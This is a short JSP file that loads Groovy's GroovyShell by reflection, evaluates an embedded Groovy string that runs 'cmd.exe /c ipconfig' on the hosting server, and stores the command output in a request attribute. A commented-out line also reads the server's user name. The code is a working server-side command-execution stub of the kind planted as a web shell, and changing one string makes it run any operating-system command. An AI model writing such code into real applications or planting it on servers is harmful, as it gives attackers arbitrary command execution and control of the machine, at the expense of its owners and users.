<%
//String groovyCode = "println 'User: '.toString() + System.getProperty('user.name')";
String groovyCode = "\"cmd.exe /c ipconfig\".execute().text";

StringBuilder output = new StringBuilder();

try {
    Class<?> groovyShellClass = Class.forName("groovy.lang.GroovyShell");
    
    Object shell = groovyShellClass.newInstance();

    java.lang.reflect.Method evaluateMethod = groovyShellClass.getMethod("evaluate", String.class);
    Object result = evaluateMethod.invoke(shell, groovyCode);
    
    if (result != null) {
        output.append(result.toString()).append("\n");
    }
    
} catch (ClassNotFoundException e) {
    output.append("ERROR: Groovy not available\n");
} catch (Exception e) {
    output.append("ERROR: Groovy execution failed - ").append(e.toString()).append("\n");
}

request.setAttribute("script_output", output.toString());
%>
